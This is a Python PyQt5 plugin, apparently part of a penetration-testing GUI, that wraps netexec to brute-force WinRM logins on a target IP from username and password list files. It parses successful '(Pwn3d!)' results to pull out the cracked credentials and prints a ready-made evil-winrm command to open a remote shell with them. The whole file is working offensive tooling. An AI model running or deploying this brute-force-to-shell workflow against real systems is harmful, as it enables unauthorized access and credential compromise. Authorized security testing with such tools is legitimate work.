import os
import re
from PyQt5.QtWidgets import QWidget, QVBoxLayout, QTextEdit, QPushButton, QMessageBox
from PyQt5.QtGui import QFont
from PyQt5.QtCore import pyqtSignal, QThread
from subprocess import Popen, PIPE

class WinRMScanThread(QThread):
    output_signal = pyqtSignal(str)      # Signal to emit output lines from netexec
    error_signal = pyqtSignal(str)       # Signal to emit error messages
    finished_signal = pyqtSignal()       # Signal to indicate scan completion
    valid_login_signal = pyqtSignal(str, str) # Signal to indicate a valid login found with username and password

    def __init__(self, ip):
        super().__init__()
        self.ip = ip

    def run(self):
        """Run the WinRM brute-force scan using netexec with temp files for usernames and passwords."""
        if not self.ip or not isinstance(self.ip, str):
            self.error_signal.emit("Invalid IP address provided for WinRM scan.")
            return

        command = [
            'netexec', 'winrm', self.ip, '-u', 'temp_usernames.txt', '-p', 'temp_passwords.txt'
        ]
        try:
            process = Popen(command, stdout=PIPE, stderr=PIPE, text=True, bufsize=1)

            # Read each line as it becomes available
            while True:
                output_line = process.stdout.readline()
                if not output_line:
                    break  # Exit loop if no more lines are available
                self.output_signal.emit(output_line.strip())

                # Check for success format and extract login details with "(Pwn3d!)" pattern
                match = re.search(r"\[\+\]\s+[\w\\.]+\\([\w\\.]+):(.+?)\s+\(Pwn3d!\)", output_line)
                if match:
                    username, password = match.groups()  # Only the username (no domain) and password
                    self.valid_login_signal.emit(username, password)  # Emit signal with username and password

            # Capture remaining stderr after stdout is done and filter out specified warnings
            stderr_output = process.stderr.read()
            if stderr_output:
                for error_line in stderr_output.splitlines():
                    if ("CryptographyDeprecationWarning" not in error_line and
                        "arc4 = algorithms.ARC4(self._key)" not in error_line):
                        self.error_signal.emit(f"Error: {error_line}")

        except Exception as e:
            self.error_signal.emit(f"WinRM Scan Error: {str(e)}")
        finally:
            self.finished_signal.emit()


class WinRMPlugin:
    _name = "WinRM Scanner"

    def __init__(self):
        self.tab = None
        self.output_area = None
        self.winrm_thread = None
        self.ip_address = None

    def create_tab(self):
        """Create the WinRM plugin's tab in the main application."""
        self.tab = QWidget()
        layout = QVBoxLayout(self.tab)

        # Set up the output area for displaying scan results
        self.output_area = QTextEdit()
        self.output_area.setReadOnly(True)
        self.output_area.setFont(QFont('Courier', 10))
        self.output_area.setStyleSheet("background-color: #3e3e3e; color: #eee; padding: 8px;")
        layout.addWidget(self.output_area)

        # Run button to manually start the WinRM brute-force scan
        self.run_button = QPushButton("Run WinRM Brute Force")
        self.run_button.setStyleSheet("background-color: #4CAF50; color: white; padding: 8px;")
        self.run_button.clicked.connect(self.run_scan)  # Connect button to run_scan method
        layout.addWidget(self.run_button)

        return self.tab

    def run_scan(self):
        """Initiate the WinRM brute-force scan and disable the button during the scan."""
        if not self.ip_address:
            self.update_output("Error: Target IP address not set.")
            return

        # Disable button while scan is running and start the scan
        self.run_button.setEnabled(False)
        self.start_scan(self.ip_address)

    def start_scan(self, ip_address):
        """Run the WinRM brute-force scan with the provided IP address."""
        if not self.ip_address:
            self.ip_address = ip_address

        if not self.ip_address or not isinstance(self.ip_address, str):
            self.update_output("Invalid IP address provided for WinRM scan.")
            self.run_button.setEnabled(True)
            return

        if self.winrm_thread and self.winrm_thread.isRunning():
            self.winrm_thread.quit()
            self.winrm_thread.wait()

        # Initialize and start the WinRM scan thread
        self.winrm_thread = WinRMScanThread(self.ip_address)
        self.winrm_thread.output_signal.connect(self.update_output)
        self.winrm_thread.error_signal.connect(self.update_output)
        self.winrm_thread.finished_signal.connect(self.scan_finished)
        self.winrm_thread.valid_login_signal.connect(self.display_winrm_command)
        self.winrm_thread.start()

    def scan_finished(self):
        """Re-enable the run button when the scan is complete."""
        self.run_button.setEnabled(True)
        self.update_output("\nScan completed.\n")

    def display_winrm_command(self, username, password):
        """Display the command for connecting to WinRM with the found credentials."""
        connection_command = f"evil-winrm -i {self.ip_address} -u '{username}' -p '{password}'"
        self.update_output(f"\nTo connect, run:\n{connection_command}\n")

    def update_output(self, output):
        """Update the WinRM results tab with new output."""
        if self.output_area:
            self.output_area.append(output)
